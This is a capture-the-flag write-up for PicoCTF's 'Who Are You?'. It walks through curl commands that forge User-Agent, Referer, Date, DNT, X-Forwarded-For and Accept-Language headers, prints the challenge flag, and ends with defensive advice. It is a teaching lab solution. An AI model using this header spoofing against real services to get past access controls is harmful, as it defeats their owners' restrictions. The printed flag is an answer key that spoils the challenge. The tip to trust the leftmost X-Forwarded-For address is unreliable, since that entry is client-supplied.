---
layout: post
title: "Who Are You?"
date: 2025-09-08
categories: [PicoCTF, Web Exploitation]
tags: [picoctf, webexploitation, http-headers, user-agent, referer, ctf, Medium]
author: Harshith
description: A PicoCTF web exploitation challenge bypassing layered HTTP header checks — User-Agent, Referer, Date, DNT, X-Forwarded-For, and Accept-Language — using curl to reveal the hidden flag.
toc: true
---

## Introduction

The **Who Are You?** challenge on PicoCTF tests your understanding of HTTP request headers. The server enforces a series of sequential header checks, each revealing a new requirement until all are satisfied and the flag is displayed. This mirrors real-world client fingerprinting and geolocation-based access controls.

> **Challenge Description:** "Identify yourself to this server using specific HTTP headers to gain access."

---

## Challenge Overview

| Field | Details |
|---|---|
| **Platform** | PicoCTF |
| **Category** | Web Exploitation |
| **Difficulty** | Medium |
| **Technique** | HTTP Header Manipulation — Sequential Bypass |

---

## Environment Setup

**Required Tools:**
- `curl` (command-line HTTP client)
- Optional: Burp Suite or browser Developer Tools for analysis

---

## Background: HTTP Request Headers

HTTP headers are metadata fields sent with every request. While most are set automatically by browsers, `curl` allows complete manual control. Servers can inspect any header to make access decisions.

**Key Headers Used in This Challenge:**

| Header | Purpose |
|---|---|
| `User-Agent` | Identifies the client software (browser, bot, etc.) |
| `Referer` | Indicates the page the request originated from |
| `Date` | Timestamp of the request |
| `DNT` | Do Not Track preference (1 = on, 0 = off) |
| `X-Forwarded-For` | IP address of the originating client (proxy header) |
| `Accept-Language` | Preferred response language and locale |

---

## Solution Walkthrough

### Step 1: Initial Request — Discover the First Requirement

```bash
curl http://mercury.picoctf.net:36622/
```

Response: The server rejects the request and tells you to identify as "PicoBrowser".

### Step 2: Set the User-Agent Header

```bash
curl -H "User-Agent: PicoBrowser" http://mercury.picoctf.net:36622/
```

Response: "Sorry, but you need to come from `mercury.picoctf.net`."

### Step 3: Add the Referer Header

```bash
curl -H "User-Agent: PicoBrowser"      -H "Referer: http://mercury.picoctf.net:36622/"      http://mercury.picoctf.net:36622/
```

Response: "Sorry, but you need to be from a year in the past."

### Step 4: Add the Date Header (Historical Date)

The server checks that the request's `Date` header is in the past (year 2018):

```bash
curl -H "User-Agent: PicoBrowser"      -H "Referer: http://mercury.picoctf.net:36622/"      -H "Date: Wed, 27 Jun 2018 03:05:00 GMT"      http://mercury.picoctf.net:36622/
```

Response: "Sorry, but you need to have Do Not Track enabled."

### Step 5: Add the DNT Header

```bash
curl -H "User-Agent: PicoBrowser"      -H "Referer: http://mercury.picoctf.net:36622/"      -H "Date: Wed, 27 Jun 2018 03:05:00 GMT"      -H "DNT: 1"      http://mercury.picoctf.net:36622/
```

Response: "Sorry, but you need to come from Sweden."

### Step 6: Add X-Forwarded-For (Swedish IP)

The server checks the originating IP's geolocation. Use a known Swedish IP address:

```bash
curl -H "User-Agent: PicoBrowser"      -H "Referer: http://mercury.picoctf.net:36622/"      -H "Date: Wed, 27 Jun 2018 03:05:00 GMT"      -H "DNT: 1"      -H "X-Forwarded-For: 31.3.152.55"      http://mercury.picoctf.net:36622/
```

Response: "Sorry, but you need to speak Swedish."

### Step 7: Add Accept-Language (Swedish)

```bash
curl -H "User-Agent: PicoBrowser"      -H "Referer: http://mercury.picoctf.net:36622/"      -H "Date: Wed, 27 Jun 2018 03:05:00 GMT"      -H "DNT: 1"      -H "X-Forwarded-For: 31.3.152.55"      -H "Accept-Language: sv,en;q=0.9"      http://mercury.picoctf.net:36622/
```

Response: The flag is returned in the HTML body.

---

## Key Concepts

**Complete Header Requirements Summary:**

| Step | Header | Value Required |
|---|---|---|
| 1 | `User-Agent` | `PicoBrowser` |
| 2 | `Referer` | `http://mercury.picoctf.net:36622/` |
| 3 | `Date` | `Wed, 27 Jun 2018 03:05:00 GMT` (past year) |
| 4 | `DNT` | `1` |
| 5 | `X-Forwarded-For` | `31.3.152.55` (Swedish IP) |
| 6 | `Accept-Language` | `sv,en;q=0.9` |

**X-Forwarded-For and IP Geolocation:**

The `X-Forwarded-For` (XFF) header is normally set by reverse proxies to preserve the original client IP when traffic is relayed. When a server trusts XFF for IP-based geolocation or access controls, an attacker can spoof any IP simply by adding the header — a classic trust misconfiguration.

---

## Flag

```
picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0da16bb2}
```

---

## Security Insights

- **Never trust client-supplied headers for security decisions:** Headers like `X-Forwarded-For`, `User-Agent`, and `Referer` are fully client-controllable and can be arbitrarily set with `curl` or any HTTP tool.
- **X-Forwarded-For is spoofable:** If a load balancer sets XFF, trust only the leftmost IP (the one closest to the actual client). Even better, derive IP from the TCP connection (REMOTE_ADDR) when security matters.
- **User-Agent fingerprinting is weak:** Blocking or allowing requests based on User-Agent is circumventable in seconds — it provides minimal real security.
- **Header enumeration in CTFs:** When stuck on a web challenge, always try iteratively adding common headers (`X-Forwarded-For`, `Referer`, `Authorization`, `X-Real-IP`, `Accept-Language`) to probe server-side logic.

---

## Conclusion

Who Are You? provides an excellent tour of HTTP request headers and the trust assumptions servers make about them. The six-layer challenge reinforces both header knowledge and the iterative enumeration technique — each error message reveals the next requirement, rewarding persistence and systematic testing.

---

## References

- [MDN Web Docs — HTTP Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [MDN — X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
- [OWASP — Testing for HTTP Header Injection](https://owasp.org/www-project-web-security-testing-guide/)
- [PicoCTF Official Platform](https://picoctf.org)
